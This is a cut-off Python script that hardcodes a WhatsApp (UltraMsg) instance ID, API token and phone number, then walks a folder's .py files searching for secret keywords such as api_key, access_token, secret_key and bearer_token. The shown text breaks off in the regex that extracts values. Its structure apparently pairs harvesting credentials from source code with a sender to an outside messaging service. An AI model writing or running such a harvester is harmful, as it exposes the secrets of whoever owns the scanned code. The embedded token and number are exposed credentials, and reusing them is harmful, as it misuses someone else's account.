import os
import re
import requests

# === WHATSAPP CONFIG ===
WHATSAPP_NUMBER = "918600609295"
INSTANCE_ID = "instance126727"
TOKEN = "2nmo6sl5l4ry94le"

# === SEND MESSAGE TO WHATSAPP ===
def send_whatsapp_message(number, message):
    url = f"https://api.ultramsg.com/{INSTANCE_ID}/messages/chat"
    payload = {
        "token": TOKEN,
        "to": number,
        "body": message
    }
    try:
        res = requests.post(url, data=payload)
        print("Message sent:", res.json())
    except Exception as e:
        print("Error sending WhatsApp message:", e)

# === SCAN CODE FILES FOR API KEY USAGE ===
def scan_code_for_keys(root_folder="."):
    keywords = [
        "api_key", "access_token", "client_id", "secret_key",
        "authorization", "bearer_token", "openai.api_key", "token"
    ]
    key_usage = {}

    for folder, dirs, files in os.walk(root_folder):
        for filename in files:
            if filename.endswith(".py"):
                path = os.path.join(folder, filename)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        for i, line in enumerate(lines):
                            for keyword in keywords:
                                if keyword in line:
                                    pattern = r"{}.*?[=:
